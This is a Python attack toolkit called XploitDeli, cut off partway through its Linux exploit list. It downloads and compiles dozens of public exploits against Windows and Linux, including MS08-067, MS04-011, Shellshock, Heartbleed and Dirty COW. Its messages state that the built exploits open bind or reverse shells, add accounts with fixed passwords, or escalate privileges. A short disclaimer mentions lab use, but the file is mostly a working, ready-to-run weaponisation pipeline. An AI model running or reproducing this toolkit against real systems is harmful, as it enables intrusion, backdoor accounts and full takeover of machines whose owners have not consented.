#!/usr/bin/python

###################################################
#
#   XploitDeli - written by Justin Ohneiser
# ------------------------------------------------
# This program produces a variety of exploits
# found on exploit-db for immediate use.
#
# Note: options with an asterisk either don't work
# or require compilation on the target.
#
# [Warning]:
# This script comes as-is with no promise of functionality or accuracy.  I strictly wrote it for personal use
# I have no plans to maintain updates, I did not write it to be efficient and in some cases you may find the
# functions may not produce the desired results so use at your own risk/discretion. I wrote this script to
# target machines in a lab environment so please only use it against systems for which you have permission!!
#-------------------------------------------------------------------------------------------------------------
# [Modification, Distribution, and Attribution]:
# You are free to modify and/or distribute this script as you wish.  I only ask that you maintain original
# author attribution and not attempt to sell it or incorporate it into any commercial offering (as if it's
# worth anything anyway :)
#
# Designed for use in Kali Linux 4.6.0-kali1-686
###################################################

import sys, os, subprocess

# ------------------------------------
# WINDOWS REMOTE
# ------------------------------------

def windows_exploit_suggester():
  commands = [
    ('Downloading...','wget https://github.com/GDSSecurity/Windows-Exploit-Suggester/archive/master.zip'),
    ('Upacking...','unzip master.zip; cp Windows-Exploit-Suggester-master/windows-exploit-suggester.py .'),
    ('Updating...','./windows-exploit-suggester.py -u'),
    ('Cleaning up...','rm master.zip; rm -r Windows-Exploit-Suggester-master')
  ]
  if run(commands):
    printGood("windows-exploit-suggester.py successfully created\n\tUsage: ./windows-exploit-suggester.py -d <database file> -o <os description> [--remote | --local]")

def ms03_026():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/100 -O ms03-026.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms03-026.c -o ms03-026.exe -lws2_32'),
    ('Cleaning up...','rm ms03-026.c')
  ]
  if run(commands):
    printGood("ms03-026.exe successfully created\n\t - creates user 'e' and pass 'asd#321'")

def ms03_039_1():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/103 -O ms03-039.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms03-039.c -o ms03-039.exe -lws2_32'),
    ('Cleaning up...','rm ms03-039.c')
  ]
  if run(commands):
    printGood("ms03-039.exe successfully created\n\t - creates user 'SST' and pass '557'")

def ms03_039_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/109 -O ms03-039.cpp'),
    ('Compiling...','i686-w64-mingw32-g++ ms03-039.cpp -o ms03-039.exe -lws2_32'),
    ('Cleaning up...','rm ms03-039.cpp')
  ]
  if run(commands):
    printGood("ms03-039.exe successfully created\n\t - creates user 'SST' and pass '557'")

def ms03_049():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/119 -O ms03-049.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms03-049.c -o ms03-049.exe -lws2_32'),
    ('Cleaning up...','rm ms03-049.c')
  ]
  if run(commands):
    printGood("ms03-039.exe successfully created\n\t - spawns bind shell on port 5555")

def ms04_007():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/3022.tar.gz -O ms04-007.tar.gz'),
    ('Unpacking...','tar xvzf ms04-007.tar.gz'),
    ('Cleaning up...','rm ms04-007.tar.gz')
  ]
  if run(commands):
    printGood("kill-bill/kill-bill.pl successfully created\n\t - spawns and connects to bind shell on port 8721")

def ms04_011_sslbof():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/275 -O ms04-011.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms04-011.c -o ms04-011.exe -lws2_32'),
    ('Cleaning up...','rm ms04-011.c')
  ]
  if run(commands):
    printGood("ms04-011.exe successfully created\n\t - spawns and connects reverse shell on port 443")

def ms04_011_lsasarv():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/295 -O ms04-011.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms04-011.c -o ms04-011.exe -lws2_32'),
    ('Cleaning up...','rm ms04-011.c')
  ]
  if run(commands):
    printGood("ms04-011.exe successfully created\n\t - spawns bind shell on given port")

def ms04_031():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/734 -O ms04-031.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms04-031.c -o ms04-031.exe -lws2_32'),
    ('Cleaning up...','rm ms04-031.c')
  ]
  if run(commands):
    printGood("ms04-031.exe successfully created\n\t - spawns bind shell on given port")

def ms05_017():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/1075 -O ms05-017.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms05-017.c -o ms05-017.exe -lws2_32'),
    ('Cleaning up...','rm ms05-017.c')
  ]
  if run(commands):
    printGood("ms05-017.exe successfully created\n\t - spawns bind shell on given port")

def ms05_039():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/1149 -O ms05-039.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms05-039.c -o ms05-039.exe -lws2_32'),
    ('Cleaning up...','rm ms05-039.c')
  ]
  if run(commands):
    printGood("ms05-039.exe successfully created\n\t - spawns bind shell on given port")

def ms06_040_1():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/2223 -O ms06-040.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms06-040.c -o ms06-040.exe -lws2_32'),
    ('Cleaning up...','rm ms06-040.c')
  ]
  if run(commands):
    printGood("ms06-040.exe successfully created\n\t - spawns bind shell on port 54321")

def ms06_040_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/2265 -O ms06-040.c'),
    ('Fixing...',"sed -i 's/WNetAddConnection2(&nr, \"\", \"\", 0) != NO_ERROR/1==2/g' ms06-040.c;"),
    ('Compiling...','i686-w64-mingw32-gcc ms06-040.c -o ms06-040.exe -lws2_32'),
    ('Cleaning up...','rm ms06-040.c')
  ]
  if run(commands):
    printGood("ms06-040.exe successfully created\n\t - spawns bind shell on port 4444")

def ms06_070():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/2789 -O ms06-070.c'),
    ('Fixing...',"sed -i 's/more informations/more informations\");/g' ms06-070.c; sed -i 's/see/\/\/see/g' ms06-070.c"),
    ('Compiling...','i686-w64-mingw32-gcc ms06-070.c -o ms06-070.exe -lws2_32'),
    ('Cleaning up...','rm ms06-070.c')
  ]
  if run(commands):
    printGood("ms06-070.exe successfully created\n\t - spawns bind shell on port 4444")

def ms08_067_1():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/7104 -O ms08-067.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms08-067.c -o ms08-067.exe -lws2_32'),
    ('Cleaning up...','rm ms08-067.c')
  ]
  if run(commands):
    printGood("ms08-067.exe successfully created\n\t - spawns bind shell on port 4444")

def ms08_067_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/7132 -O ms08-067.py'),
    ('Preparing...','chmod 744 ms08-067.py')
  ]
  if run(commands):
    printGood("ms08-067.py successfully created\n\t - spawns bind shell on 4444")

def ms08_067_3():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/6841.rar -O ms08-067.rar'),
    ('Unpacking...','mkdir ms08-067; cd ms08-067; unrar e ../ms08-067.rar'),
    ('Cleaning up...','rm ms08-067.rar; cp ms08-067/MS08-067.exe ms08-067.exe; rm -r ms08-067')
  ]
  if run(commands):
    printGood("ms08-067.exe successfully created\n\t")

def ms09_050():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/14674.zip -O ms09-050.zip'),
    ('Unpacking...','unzip ms09-050.zip'),
    ('Cleaning up...','rm ms09-050.zip'),
    ('Compiling...','cd smb2_exploit_release/smb2_exploit; i686-w64-mingw32-g++ smb2_exploit.cpp -o smb2_exploit.exe -lws2_32')
  ]
  if run(commands):
    printGood("/smb2_exploit_release/smb2_exploit/smb2_exploit.exe successfully created\n\t - spawns bind shell on 28876")

exploits_windows_remote = [
  ("windows_exploit_suggester"  ,   windows_exploit_suggester),
  ("ms03-026"   ,	ms03_026),
  ("ms03-039 (1)"	,	ms03_039_1),
  ("ms03-039 (2)"   ,   ms03_039_2),
  ("*ms03-049"  ,   ms03_049),
  ("ms04-007"	,	ms04_007),
  ("ms04-011 - ssl bof" 	,	ms04_011_sslbof),
  ("ms04-011 - lsasarv.dll"	,	ms04_011_lsasarv),
  ("ms04-031"   ,   ms04_031),
  ("ms05-017"   ,   ms05_017),
  ("ms05-039"   ,   ms05_039),
  ("*ms06-040 (1)"   ,   ms06_040_1),
  ("ms06-040 (2)"   ,   ms06_040_2),
  ("ms06-070"   ,   ms06_070),
  ("*ms08-067 (1)"   ,   ms08_067_1),
  ("ms08-067 (2)"   ,   ms08_067_2),
  ("ms08-067 (3)"   ,   ms08_067_3),
  ("*ms09-050"   ,   ms09_050)
]

# ------------------------------------
# WINDOWS LOCAL
# ------------------------------------

def windows_privesc_check():
  commands = [
    ('Downloading...','wget https://github.com/pentestmonkey/windows-privesc-check/archive/master.zip -O windows-privesc-check.zip'),
    ('Unpacking','unzip windows-privesc-check.zip; cp windows-privesc-check-master/windows-privesc-check2.exe .'),
    ('Cleaning up...','rm windows-privesc-check.zip; rm -r windows-privesc-check-master')
  ]
  if run(commands):
    printGood("windows-privesc-check2.exe successfully created")

def ms04_011_local():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/271 -O ms04-011.c'),
    ('Fixing...',"sed -i 's/Winuser.h/winuser.h/g' ms04-011.c"),
    ('Compiling...','i686-w64-mingw32-gcc ms04-011.c -o ms04-011.exe -I/usr/i686-w64-mingw32/include/'),
    ('Cleaning up...','rm ms04-011.c')
  ]
  if run(commands):
    printGood("ms04-011.exe successfully created\n\t")

def ms04_019_1():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/350 -O ms04-019.c'),
    ('Fixing...',"sed -i 's/Utility Manager and then/Utility Manager and then run\");/g' ms04-019.c; sed -i 's/run UtilManExploit2.exe/\/\/run UtilManExploit2.exe/g' ms04-019.c; sed -i 's/in the taskbar/\/\/in the taskbar/g' ms04-019.c; sed -i 's/lParam must be/\/\/lParam must be/g' ms04-019.c; sed -i 's/close open error window/\/\/close open error window/g' ms04-019.c; sed -i 's/close utility manager/\/\/close utility manager/g' ms04-019.c"),
    ('Compiling...','i686-w64-mingw32-gcc ms04-019.c -o ms04-019.exe -lws2_32'),
    ('Cleaning up...','rm ms04-019.c')
  ]
  if run(commands):
    printGood("ms04-019.exe successfully created\n\t - run 'utilman.exe /start', then execute")

def ms04_019_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/352 -O ms04-019.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms04-019.c -o ms04-019.exe -lws2_32'),
    ('Cleaning up...','rm ms04-019.c')
  ]
  if run(commands):
    printGood("ms04-019.exe successfully created\n\t")

def ms04_019_3():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/355 -O ms04-019.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms04-019.c -o ms04-019.exe -lws2_32'),
    ('Cleaning up...','rm ms04-019.c')
  ]
  if run(commands):
    printGood("ms04-019.exe successfully created\n\t")

def ms04_020():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/351 -O ms04-020.c'),
    ('Fixing...',"sed -i 's/Winsock2.h/winsock2.h/g' ms04-020.c; sed -i 's/_snprintf/\/\/_snprintf/g' ms04-020.c; sed -i 's/pax -h/\/\/pax -h/g' ms04-020.c"),
    ('Compiling...','i686-w64-mingw32-gcc ms04-020.c -o ms04-020.exe -lws2_32'),
    ('Cleaning up...','rm ms04-020.c')
  ]
  if run(commands):
    printGood("ms04-020.exe successfully created\n\t")

def keybd():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/1197 -O keybd.c'),
    ('Compiling...','i686-w64-mingw32-gcc keybd.c -o keybd.exe -lws2_32'),
    ('Cleaning up...','rm keybd.c')
  ]
  if run(commands):
    printGood("keybd.exe successfully created\n\t - run 'runas /user:restrcited cmd.exe', 'tlist.exe | find \"explorer.exe\"' (get pid), then run keybd.exe <pid>")

def ms05_018():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/1198 -O ms05-018.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms05-018.c -o ms05-018.exe -lws2_32 advapi32.lib'),
    ('Cleaning up...','rm ms05-018.c')
  ]
  if run(commands):
    printGood("ms05-018.exe successfully created\n\t")

def ms05_055():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/1407 -O ms05-055.c'),
    ('Compiling...','i686-w64-mingw32-g++ ms05-055.c -o ms05-055.exe -lws2_32'),
    ('Cleaning up...','rm ms05-055.c')
  ]
  if run(commands):
    printGood("ms05-055.exe successfuly created\n\t")

def ms06_030():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/1911 -O ms06-030.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms06-030.c -o ms06-030.exe -lws2_32'),
    ('Cleaning up...','rm ms06-030.c')
  ]
  if run(commands):
    printGood("ms06-030.exe successfully created\n\t")

def ms06_049():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/2412 -O ms06-049.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms06-049.c -o ms06-049.exe -lws2_32'),
    ('Cleaning up...','rm ms06-049.c')
  ]
  if run(commands):
    printGood("ms06-049.exe successfully created\n\t")

def spool():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/3220 -O spool.c'),
    ('Fixing...',"sed -i 's/Winspool.h/winspool.h/g' spool.c; sed -i 's/EnumPrintersA/\/\/EnumPrintersA/g' spool.c"),
    ('Compiling...','i686-w64-mingw32-gcc spool.c -o spool.exe'),
    ('Cleaning up...','rm spool.c')
  ]
  if run(commands):
    printGood("spool.exe successfully created\n\t - spawns bindshell on port 51477")

def ms08_025():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5518.zip -O ms08-025.zip'),
    ('Unpacking...','mkdir ms08-025; cd ms08-025;unzip ../ms08-025.zip'),
    ('Compiling...','cd ms08-025; i686-w64-mingw32-gcc ms08-25-exploit.cpp -o ../ms08-025.exe -lws2_32'),
    ('Cleaning up...','rm ms08-025.zip; rm -r ms08-025')
  ]
  if run(commands):
    printGood("ms08_025.exe successfully created\n\t")

def netdde():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/21923 -O netdde.c'),
    ('Fixing...',"sed -i 's/source:/\/\/source:/g' netdde.c; sed -i 's/The Winlogon/\/\/The Winlogon/g' netdde.c"),
    ('Compiling...','i686-w64-mingw32-gcc netdde.c -o netdde.exe'),
    ('Cleaning up...','rm netdde.c')
  ]
  if run(commands):
    printGood("netdde.exe successfully created\n\t")

def ms10_015():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/11199.zip -O ms10-015.zip'),
    ('Unpacking...','unzip ms10-015.zip; cp KiTrap0D/vdmallowed.exe ms10-015.exe'),
    ('Cleaning up...','rm ms10-015.zip; rm -r KiTrap0D')
  ]
  if run(commands):
    printGood("ms10-015.exe successfully created\n\t")

def ms10_059():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/14610.zip -O ms10-059.zip'),
    ('Unpacking...','unzip ms10-059.zip'),
    ('Compiling...','cd Chimichurri; i686-w64-mingw32-g++ Chimichurri.cpp -o ../ms10-059.exe -lws2_32'),
    ('Cleaning up...','rm ms10-059.zip; rm -r Chimichurri')
  ]
  if run(commands):
    printGood("ms10-059.exe successfully created\n\t")

def ms10_092():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/15589 -O ms10-092.wsf'),
  ]
  if run(commands):
    printGood("ms10-092.wsf successfully created\n\t - use 'cscript ms10-092.wsf' to execute")

def ms11_080():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/18176 -O ms11-080.py'),
    ('Converting...','wine "C:\\Python27\\python.exe" /usr/share/pyinstaller/pyinstaller.py --onefile ms11-080.py'),
    ('Cleaning up...','cp dist/ms11-080.exe ms11-080.exe; rm ms11-080.py; rm -r dist build ms11-080.spec')
  ]
  if run(commands):
    printGood("ms11_080.exe successfully created\n\t")

def ms14_040():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/39525 -O ms14-040.py'),
    ('Converting...','wine "C:\\Python27\\python.exe" /usr/share/pyinstaller/pyinstaller.py --onefile ms14-040.py'),
    ('Cleaning up...','cp dist/ms14-040.exe ms14-040.exe; rm ms14-040.py; rm -r dist build ms14-040.spec')
  ]
  if run(commands):
    printGood("ms14-040.exe successfully created")

def ms14_058_1():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39666.zip -O ms14-058.zip'),
    ('Unpacking...','unzip ms14-058.zip'),
    ('Compiling...','cd 39666/Exploit/Exploit; i686-w64-mingw32-g++ Exploit.cpp -o ../../../ms14-058.exe -lws2_32'),
    ('Cleaning up...','rm ms14-058.zip; rm -r 39666 __MACOSX')
  ]
  if run(commands):
    printGood("")

def ms14_058_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/37064 -O ms14-058.py'),
    ('Converting...','wine "C:\\Python27\\python.exe" /usr/share/pyinstaller/pyinstaller.py --onefile ms14-058.py'),
    ('Cleaning up...','cp dist/ms14-058.exe ms14-058.exe; rm ms14-058.py; rm -r dist build ms14-058.spec')
  ]
  if run(commands):
    printGood("ms14-058.exe successfully created\n\t")

def ms14_070_1():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/37755 -O ms14-070.c'),
    ('Compiling...','i686-w64-mingw32-gcc ms14-070.c -o ms14-070.exe -lws2_32'),
    ('Cleaning up...','rm ms14-070.c')
  ]
  if run(commands):
    printGood("ms14-070.exe successfully created\n\t")

def ms14_070_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/35936 -O ms14-070.py'),
    ('Note: requires manual fixing, then execute the following command:','echo \'wine "C:\\Python27\\python.exe" /usr/share/pyinstaller/pyinstaller.py --onefile ms14-070.py\'')
  ]
  run(commands)

def ms15_010_1():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39035.zip -O ms15_010.zip'),
    ('Unpacking...','unzip ms15_010.zip'),
    ('Fixing...',"cd 39035; sed -i 's/Strsafe.h/strsafe.h/g' main.cpp; sed -i 's/Shlwapi.h/shlwapi.h/g' main.cpp"),
    ('Compiling...','cd 39035; i686-w64-mingw32-g++ main.cpp -o ../ms15-010.exe'),
    ('Cleaning up...','rm ms15_010.zip; rm -r 39035')
  ]
  if run(commands):
    printGood("ms15-010.exe successfully created\n\t")

def ms15_010_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/37098 -O ms15-010.cpp'),
    ('Fixing...','head -n 287 ms15-010.cpp > ex.cpp; tail -n 59 ms15-010.cpp > ex.h'),
    ('Compiling...','i686-w64-mingw32-g++ ex.cpp -o ms15-010.exe'),
    ('Cleaning up...','rm ms15-010.cpp')
  ]
  if run(commands):
    printGood("ms15-010.exe successfully created")

def ms15_051():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37049-32.exe -O ms15-051_32.exe; wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37049-64.exe -O ms15-051_64.exe')
  ]
  if run(commands):
    printGood("ms15-051_32.exe and ms15_051_64.exe successfully created")

def ms16_014():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40039.zip -O ms16-014.zip'),
    ('Unpacking...','unzip ms16-014.zip'),
    ('Compiling...','cd 40039; i686-w64-mingw32-g++ MS16-014.cpp -o ../ms16-014.exe'),
    ('Cleaning up...','rm -r ms16-014.zip __MACOSX')
  ]
  if run(commands):
    printGood("ms16-014.exe successfully created")

def ms16_016():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39788.zip -O ms16-016.zip'),
    ('Unpacking...','unzip ms16-016.zip; cd 39788; unzip compiled.zip'),
    ('Cleaning up...','cp 39788/EoP.exe ms16_016.exe; cp 39788/Shellcode.dll Shellcode.dll;rm ms16-016.zip; rm -r 39788 __MACOSX')
  ]
  if run(commands):
    printGood("ms16_016.exe and Shellcode.dll successfully created")

def ms16_032():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/39719 -O ms16_032.ps1')
  ]
  if run(commands):
    printGood("ms16_032.ps1 successfully created\n\t - for use with powershell")

exploits_windows_local = [
  ("windows-privesc-check"  ,   windows_privesc_check),
  ("ms04-011"	,	ms04_011_local),
  ("ms04-019 (1)"   ,   ms04_019_1),
  ("ms04-019 (2)"   ,   ms04_019_2),
  ("ms04-019 (3)"   ,   ms04_019_3),
  ("ms04-020"   ,   ms04_020),
  ("*keybd_event"    ,   keybd),
  ("*ms05-018"   ,   ms05_018),
  ("*ms05-055"   ,   ms05_055),
  ("ms06-030"   ,   ms06_030),
  ("ms06-049"   ,   ms06_049),
  ("print spool service"  ,   spool),
  ("*ms08-025"   ,   ms08_025),
  ("netdde"     ,   netdde),
  ("ms10-015"   ,   ms10_015),
  ("ms10-059"   ,   ms10_059),
  ("ms10-092"   ,   ms10_092),
  ("ms11-080"   ,   ms11_080),
  ("ms14-040"   ,   ms14_040),
  ("*ms14-058 (1)"   ,   ms14_058_1),
  ("ms14-058 (2)"   ,   ms14_058_2),
  ("*ms14-070 (1)"   ,   ms14_070_1),
  ("ms14-070 (2)"   ,   ms14_070_2),
  ("*ms15-010 (1)"   ,   ms15_010_1),
  ("*ms15-010 (2)"   ,   ms15_010_2),
  ("ms15-051"   ,   ms15_051),
  ("*ms16-014"   ,   ms16_014),
  ("ms16-016"   ,   ms16_016),
  ("ms16-032"   ,   ms16_032)
]

# ------------------------------------
# LINUX REMOTE
# ------------------------------------

def shellshock():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/34900 -O shellshock.py'),
    ('Preparing...','chmod 744 shellshock.py')
  ]
  if run(commands):
    printGood("shellshock.py successfully created\n\t")

def heartbleed():
  commands = [
    ('Downloading...','wget https://raw.githubusercontent.com/HackerFantastic/Public/master/exploits/heartbleed.c -O heartbleed.c'),
    ('Compiling...','gcc heartbleed.c -o heartbleed -Wl,-Bstatic -lssl -Wl,-Bdynamic -lssl3 -lcrypto'),
    ('Cleaning up...','rm heartbleed.c')
  ]
  if run(commands):
    printGood("heartbleed successfully created\n\tUsage: heartbleed -s <target> -p <port> -f <output file> -v -t 1")

exploits_linux_remote = [
  ("shellshock"	 	,	shellshock),
  ("heartbleed"     ,   heartbleed)
]

# ------------------------------------
# LINUX LOCAL
# -- These should be compiled on target if possible
# ------------------------------------

def linux_exploit_suggester():
  commands = [
    ('Downloading...','apt-get install linux-exploit-suggester'),
    ('Cleaning up...','cp /usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl linux-exploit-suggester.pl')
  ]
  if run(commands):
    printGood("linux-exploit-suggester.pl successfully created\n\tUsage: perl linux-exploit-suggester.pl -k <kernel>")

def unix_privesc_check():
  commands = [
    ('Downloading...','wget http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz'),
    ('Unpacking...','tar xvzf unix-privesc-check-1.4.tar.gz; cp unix-privesc-check-1.4/unix-privesc-check .'),
    ('Cleaning up...','rm unix-privesc-check-1.4.tar.gz; rm -r unix-privesc-check-1.4')
  ]
  if run(commands):
    printGood("unix_privesc_check successfully created")

def sendpage_1():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/9545 -O sendpage.c'),
    ('Compile with:','echo "gcc -Wall -o sendpage sendpage.c"')
  ]
  run(commands)

def sendpage_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/9479 -O sendpage.c'),
    ('Compile with:','echo "gcc -Wall -o sendpage sendpage.c"')
  ]
  run(commands)

def ftruncate():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/6851 -O ftruncate.c'),
    ('Compile with:','echo "gcc -o ftruncate ftruncate.c"'),
    ('Note: use in world-writable directory, located using the following command:','echo "find / -perm -2000 -type d 2>/dev/null|xargs ls -ld|grep "rwx""')
  ]
  run(commands)

def cap_sys_admin():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/15944 -O cap_sys_admin.c'),
    ('Compile with:','echo "gcc -w cap_sys_admin.c -o cap_sys_admin_expl"')
  ]
  run(commands)

def compat():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/15024 -O compat.c'),
    ('Compile with:','echo "gcc -o compat compat.c"')
  ]
  run(commands)

def can_bcm():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/14814 -O can_bcm_expl.c'),
    ('Compile with:','echo "gcc -o can_bcm_expl can_bcm_expl.c"')
  ]
  run(commands)

def rdsProtocol():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/15285 -O rds_expl.c'),
    ('Compile with:','echo "gcc -o rds_expl rds_expl.c"')
  ]
  run(commands)

def halfNelson():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/17787 -O half-nelson.c'),
    ('Compile with:','echo "gcc -o half-nelson half-nelson.c -lrt"')
  ]
  run(commands)

def fullNelson():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/15704 -O full-nelson.c'),
    ('Compile with:','echo "gcc -o full-nelson full-nelson.c"')
  ]
  run(commands)

def udev():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/8572 -O udev_expl.c'),
    ('Compile with:','echo "gcc -o udev_expl udev_expl.c"')
  ]
  run(commands)

def sgid():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/33824 -O sgid_expl.c'),
    ('Compile with:','echo "gcc -o sgid_expl sgid_expl.c"')
  ]
  run(commands)

def overlayfs_1():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/37292 -O overlayfs.c'),
    ('Compile with:','echo "gcc -o overlayfs overlayfs.c"')
  ]
  run(commands)

def libfutex():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/35370 -O libfutex.c'),
    ('Compile with:','echo "gcc -o libfutex libfutex.c -lpthread"')
  ]
  run(commands)

def mempodipper():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/18411 -O mempodipper.c'),
    ('Compile with:','echo "gcc -o mempodipper mempodipper.c"')
  ]
  run(commands)

def alpha_omega():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/17391 -O alpha-omega.c'),
    ('Compile with:','echo "gcc -o alpha-omega alpha-omega.c"')
  ]
  run(commands)

def dirtycow():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/40616 -O dirtycow_64.c'),
    ('Fixing...',"cp dirtycow_64.c dirtycow_32.c; sed -i 's/0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/\/* 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/g' dirtycow_32.c; sed -i 's/unsigned int sc_len = 177;/unsigned int sc_len = 177; *\//g' dirtycow_32.c; sed -i 's/0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/*\/ 0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/g' dirtycow_32.c; sed -i 's/unsigned int sc_len = 136;/unsigned int sc_len = 136;\/*/g' dirtycow_32.c"),
    ('Compile with:','echo "gcc -o dirtycow_64 dirtycow_64.c -pthread"; echo "gcc -o dirtycow_32 dirtycow_32.c -pthread"')
  ]
  run(commands)

def msr():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/27297 -O msr_expl.c'),
    ('Compile with:','echo "gcc -o msr_expl msr_expl.c"')
  ]
  run(commands)

def perf_swevent_init():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/26131 -O perf.c'),
    ('Compile with:','echo "gcc -o perf perf.c"')
  ]
  run(commands)

def overlayfs_2():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/39166 -O overlayfs.c'),
    ('Compile with:','echo "gcc -o overlayfs overlayfs.c"')
  ]
  run(commands)

def overlayfs_3():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/39230 -O overlayfs.c'),
    ('Compile with:','echo "gcc -o overlayfs overlayfs.c"')
  ]
  run(commands)

def af_packet():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/40871 -O af_packet.c'),
    ('Compile with: ','echo "gcc -o af_packet af_packet.c -lpthread"')
  ]
  run(commands)

def double_fdput():
  commands = [
    ('Downloading...','wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip -O double_fdput.zip'),
    ('Unpacking...','unzip double_fdput.zip; cd 39772; tar xvf exploit.tar;'),
    ('Compile with: ','echo "cd 39772/ebpf_mapfd_doubleput_exploit; ./compile.sh"'),
    ('Run ./doubleput','')
  ]
  run(commands)

def netfilter():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/40049 -O netfilter.c'),
    ('Fixing...','tail -n 50 netfilter.c > pwn.c; head -n 213 netfilter.c > intermediate.c; tail -n 208 intermediate.c > decr.c'),
    ('Compile with:','echo "gcc -o decr decr.c -m32 -O2; gcc pwn.c -O2 -o pwn"'),
    ('Run decr, then pwn',''),
    ('Cleaning up...','rm netfilter.c intermediate.c')
  ]
  run(commands)

def refcount():
  commands = [
    ('Downloading...','wget https://www.exploit-db.com/download/39277 -O refcount.c'),
    ('Compile with:','echo "gcc -o refcount refcount.c -lkeyutils -Wall"')
  ]
  run(commands)

exploits_linux_local = [
  ("linux-exploit-suggester"    ,   linux_exploit_suggester),
  ("unix_privesc_check"     ,   unix_privesc_check),
